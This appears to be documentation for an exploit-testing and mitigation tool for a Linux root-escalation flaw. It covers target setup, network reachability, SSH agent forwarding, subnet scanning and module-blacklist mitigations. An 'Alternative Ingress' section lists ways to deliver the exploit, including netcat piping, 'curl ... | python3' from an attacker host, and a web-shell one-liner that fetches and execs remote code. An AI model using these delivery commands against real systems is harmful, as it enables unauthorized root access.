# Setting Up Linux Targets

How to configure various Linux targets for testing with Copy Fail MCP.

**Prerequisites:**
1. SSH access with key authentication — your public key on the target's `~/.ssh/authorized_keys`
2. SSH agent running on your machine — `ssh-add -l` shows a key
3. Network connectivity — both machines can reach each other

---

## Threat Scenario: Same WiFi, No Protection

**Common misconception:** "WPA2 is on, so I'm isolated from other devices on the WiFi."

**Reality:** WPA2/3 encrypts *the air* between your machine and the Access Point.
Once traffic reaches the AP, it is decrypted and forwarded onto the LAN as plain
Ethernet. Any other device on the same subnet can talk to you directly — WPA
does nothing to stop it.

This means: in a cafe, makerspace, conference, or co-working space, anyone on
the same WiFi can SSH into your Linux laptop if:
- SSH is running (it usually is)
- You have a default/guessable username (ubuntu, pi, admin, etc.)
- Your password is weak or you use key auth with the key on disk

### The Copy Fail variant

```
Attacker (Windows)           AP (WPA2 on)          Victim (Linux)
     │                            │                      │
     │  ─── WPA2 encrypted ───→   │                      │
     │                            │  ── plain Ethernet ──→│
     │                            │                      │
     │  ─── SSH to 192.168.1.42 ──────────────────────→   │
     │       (WPA did not block this)                    │
     │                            │                      │
     │  $ python3 -c "732 bytes"                         │
     │  $ su                                              │
     │  # whoami → root                                   │
```

WPA did not prevent the SSH connection. The exploit works.
The Linux box is now pivoted into the network.

### Mitigation

| Mitigation | Effectiveness | Caveat |
|------------|---------------|--------|
| **Your own phone hotspot** | Perfect | Both machines connect to iPhone/Android AP. No other devices on the network. Trivial to set up. |
| **AP client isolation** | Perfect | Blocks all peer-to-peer LAN traffic. Every AP calls it something different (AP Isolation, Station Isolation, Guest Network, Client Separation). |
| **VPN (Tailscale/WireGuard)** | Perfect | Creates an encrypted tunnel outside the LAN. Even if the LAN is hostile, your traffic is safe. |
| **Firewall on the Linux box** | Good | `sudo ufw enable` blocks inbound connections. But the exploit only needs SSH reachable — if you opened 22 for remote work, this won't help. |
| **WPA3 SAE** | **None** | WPA3 is also only over-the-air encryption. Same LAN attack still works. |

### Bottom line

If you want to test Copy Fail in a cafe, **use your phone as a hotspot**.
Both machines connect to it. No one else is on that network. It takes 30 seconds
and eliminates the entire threat surface.

If you cannot use a hotspot (no mobile signal), use a Tailscale network.
Both machines join the same virtual network, and the exploit traffic travels
through an encrypted WireGuard tunnel — even over hostile WiFi.

---

## Network Requirements (Common Pitfalls)

This tool needs a direct TCP connection from your MCP host to the target's SSH port (22).
Here is what works and what doesn't:

| Scenario | Works? | Why |
|----------|--------|-----|
| Same home LAN (WiFi) | Yes | AP forwards client-to-client traffic |
| Phone hotspot (both connected) | Yes | Same subnet, no isolation |
| Direct Ethernet cable | Yes | Layer 2, nothing in the way |
| Coffee shop / public WiFi | **No** | **Client isolation** — AP blocks peer-to-peer frames. You can't even ping each other. |
| Enterprise WiFi (802.1X) | **Maybe not** | Often uses VLAN-per-client or client isolation |
| VPN (Tailscale, ZeroTier, WireGuard) | Yes | Creates a virtual Layer 2/3 network between peers |
| Across the internet (no VPN) | **Unlikely** | Home NAT + ISP CGNAT + firewall. Unless you've set up port forwarding and a public IP. |

### How to check if you can reach a target

```bash
# On your machine, try to reach the target's SSH port
nc -zv TARGET_IP 22
# If this hangs or says "Connection refused", you cannot reach it.
# If it says "Connected to TARGET_IP", you're good.

# If nc fails, try a ping:
ping -n 1 TARGET_IP
# On public/coffee shop WiFi, this will timeout due to client isolation.
```

### Quick fix for demo / classroom: phone hotspot

```text
1. Both laptops: connect to the same phone hotspot (NOT the coffee shop WiFi)
2. Find each other's IP: ip addr (Linux) or ipconfig (Windows)
3. Test: nc -zv FRIEND_IP 22
4. If it says "Connected", you're ready
```

Phone hotspots do NOT use client isolation. This is the most reliable way to
demonstrate the tool in a cafe or conference setting. No infrastructure needed.

### For remote targets across the internet

Use a VPN (Tailscale is the easiest):

```bash
# Both machines install Tailscale
curl -fsSL https://tailscale.com/install.sh | sh
sudo tailscale up

# Then connect via the Tailscale IP (100.x.x.x)
copy-fail check --host 100.65.23.180
```

Tailscale creates a direct WireGuard tunnel even through NAT and CGNAT.
No port forwarding needed.

---

## Local Docker Container

```bash
# 1. Create a vulnerable test container (Ubuntu 22.04 LTS)
docker run -d --name cf-test \
  -p 2222:22 \
  ubuntu:22.04 bash -c "
    apt-get update && apt-get install -y openssh-server python3 sudo
    mkdir /var/run/sshd
    echo 'root:password' | chpasswd
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
    service ssh start
    tail -f /dev/null
  "

# 2. Add your SSH key (from host)
# Copy your public key into the container:
docker cp ~/.ssh/id_rsa.pub cf-test:/root/.ssh/authorized_keys
docker exec cf-test chmod 600 /root/.ssh/authorized_keys

# 3. Use in Copy Fail MCP
# Host: 127.0.0.1
# Port: 2222
# User: root
```

> Your host SSH agent must be forwarded. See SSH agent section below.

---

## WSL2 (Windows Subsystem for Linux)

WSL2 instances run on a virtual network. Each distro has its own IP.

```bash
# 1. Get WSL IP (run inside WSL)
ip addr show eth0 | grep inet
# Typically 172.x.x.x or 192.168.x.x

# 2. Install SSH server (inside WSL)
sudo apt update && sudo apt install -y openssh-server python3
sudo service ssh start

# 3. Add your Windows SSH key to WSL
# From Windows PowerShell:
cp $env:USERPROFILE\.ssh\id_rsa.pub \\wsl$\<distro>\home\<user>\.ssh\authorized_keys

# 4. Connect from Windows to WSL via the WSL IP on port 22
```

**Alternative:** Use `localhost` forwarding. WSL2 makes SSH available
on `localhost` on the Windows side if configured:

```bash
# In WSL, check if sshd is running on localhost
sudo sed -i 's/#ListenAddress 0.0.0.0/ListenAddress 0.0.0.0/' /etc/ssh/sshd_config
sudo service ssh restart
# Now connect to 127.0.0.1:22 from Windows
```

---

## Raspberry Pi (or any ARM Linux)

```bash
# 1. Enable SSH on the Pi
# Run raspi-config or:
sudo systemctl enable ssh
sudo systemctl start ssh

# 2. Copy your SSH key
ssh-copy-id pi@<raspberry-pi-ip>

# 3. Verify connectivity
ssh -A pi@<raspberry-pi-ip> uname -r

# 4. Test with Copy Fail MCP
copy-fail check --host <raspberry-pi-ip> --user pi
```

Raspberry Pi OS is typically based on Debian 11/12 (kernel 6.x), which
has patches available. Check with `cf_check_target`.

---

## OpenWrt Router

OpenWrt is **confirmed vulnerable** (CVE-2026-31431) and **currently unpatched**
as of 2026-05-02.

```bash
# 1. Enable SSH on the router
# LuCI → System → Administration → SSH Access
# Or via CLI:
uci set dropbear.@dropbear[0].PasswordAuth='on'
uci commit dropbear
/etc/init.d/dropbear restart

# 2. Copy your SSH key
ssh-copy-id root@<router-ip>

# 3. Verify
ssh -A root@<router-ip> uname -r
# Expected output: 6.12.74 or similar (kernel >= 4.14 = vulnerable)

# 4. Test
copy-fail assess --host <router-ip> --force
# force=True needed because OpenWrt is not in the "patched distro" list
```

**WARNING:** OpenWrt currently has **no patch available**. Running the
exploit will work. There is no way to fix it until the OpenWrt team
backports the kernel fix. Monitor:
https://forum.openwrt.org/t/cve-2026-31431

---

## VM (Proxmox, VMware, VirtualBox)

```bash
# 1. Install SSH server on the VM
sudo apt install -y openssh-server python3

# 2. Get the VM IP
ip addr show | grep inet

# 3. Copy SSH key
ssh-copy-id user@<vm-ip>

# 4. Test
copy-fail check --host <vm-ip>
```

For NAT networks, you may need port forwarding on the hypervisor host.

---

## SSH Agent Forwarding

This tool defaults to SSH with agent forwarding. No passwords are stored.

But **SSH is not the only way** to deliver the exploit. See the next section.

---

### On Windows (PowerShell)

```powershell
# Start the SSH agent
Start-Service ssh-agent

# Add your key
ssh-add $env:USERPROFILE\.ssh\id_rsa

# Verify
ssh-add -l
```

### On macOS / Linux

```bash
# Agent starts automatically. Add key if needed:
ssh-add ~/.ssh/id_rsa

# Verify
ssh-add -l
```

### Verify agent forwarding works

```bash
# Connect to a target with -A flag
ssh -A root@<target> "echo $SSH_AUTH_SOCK"
# Should print /tmp/ssh-xxxxx/agent.xxxxx (not empty)
```

If `$SSH_AUTH_SOCK` is empty on the target, agent forwarding is not
working. Check:
1. `ssh-agent` is running on your local machine
2. Your key is added (`ssh-add -l` shows a key)
3. You used `-A` flag or `ForwardAgent yes` in `~/.ssh/config`
4. The target's `sshd_config` has `AllowAgentForwarding yes`

---

---

## WARNING: IoT Devices (Tapo, Smart Plugs, Cameras, etc.)

Many IoT devices — including **Tapo cameras, Kasa smart plugs, random IP cameras,
NAS devices, and smart TVs** — run Linux kernels >= 4.14. They are **potential
targets** for CVE-2026-31431 and most will **never receive a patch**.

**However:**

- Most IoT devices do not have SSH exposed. They use proprietary protocols.
- Gaining SSH access typically requires **jailbreaking / rooting** the device,
  which voids warranties and may brick the device.
- Testing against devices you do not own is **illegal**.
- IoT vendors rarely publish kernel versions, so you don't even know if
  they're vulnerable without reverse engineering.

**Bottom line:** Do not test against IoT devices unless you own them,
have jailbroken them, and have verified SSH access. The network scanner
(`cf_scan_network`) probes port 22 only — it will not discover devices
that don't run SSH.

If you have jailbroken a Tapo camera or similar, you can test it like
any other Linux host:

```bash
# After gaining SSH access (requires device-specific jailbreak)
copy-fail check --host <device-ip> --user root
```

But: **do not attempt to exploit devices you do not own.**

---

## Alternative Ingress (No SSH)

SSH is convenient but not required. The exploit is a **732-byte Python 3.10+
stdlib-only script** — it can be delivered over almost any channel.

### Option 1: `cf_get_exploit_script` MCP tool

Returns the exploit as plain text. Pipe it anywhere:

```bash
# Netcat from your MCP server to a listener on the target
copy-fail tool cf_get_exploit_script | nc TARGET_IP 9999

# On the target, receive and pipe to python:
nc -l -p 9999 | python3
```

### Option 2: Direct download from a web server

The `cf_get_exploit_script` response can be served via a simple HTTP endpoint.
Then on the target:

```bash
curl -s http://YOUR_IP:PORT/exploit | python3
```

### Option 3: Web shell / RCE

```bash
# From a web shell or command injection:
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://YOUR_IP/exp.py').read())"
```

### Option 4: Physical / USB drop

The exploit is 732 bytes. It fits on a floppy disk. Write it to a USB,
plug into the target, run:

```bash
python3 /media/usb/exp.py
```

### Option 5: Container exec

```bash
docker exec -it CONTAINER_NAME bash
# Then use cf_exploit_local tool or paste the script
```

### Option 6: Just paste it

The entire exploit is small enough to paste into any terminal:

```python
# cf_get_exploit_script() gives you the raw text
# Copy-paste it into an SSH session, web shell, serial console, etc.
cat > /tmp/exp.py << 'EOF'
#!/usr/bin/env python3
# ... paste the 732 bytes here ...
EOF
python3 /tmp/exp.py
```

---

## Applying Mitigation

If you find a vulnerable system that cannot be patched via distro updates
(e.g., OpenWrt with no patch, embedded device), you can apply a mitigation:

### Via the webapp

Use the **Mitigate** tab in the dashboard. Dry-run first to see the
commands, then apply.

### Via the MCP tool

```python
# Check what mitigation would do (dry run)
cf_apply_mitigation(host="192.168.1.100", dry_run=True)

# Apply mitigation
cf_apply_mitigation(host="192.168.1.100", dry_run=False)
```

### What mitigation does

**If CONFIG_CRYPTO_USER_API_AEAD=m (module):**
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
No reboot needed. The module cannot be loaded.

**If CONFIG_CRYPTO_USER_API_AEAD=y (built-in):**
```bash
grubby --update-kernel=ALL --args="initcall_blacklist=algif_aead_init"
```
Reboot required. The initcall blacklist prevents the vulnerable code from
initializing at boot.

**Neither affects dm-crypt/LUKS, IPsec, OpenSSL, or SSH.**

---

## Local Network Discovery

Use the webapp's **Network Scan** tab or the MCP tool or CLI:

```python
# MCP tool
cf_scan_network(cidr="192.168.1.0/24", only_linux=True)

# CLI
copy-fail scan --subnet 192.168.1.0/24
```

Scans port 22 on all IPs in the subnet via async TCP connect.
Returns hosts identified as Linux via SSH banner analysis.
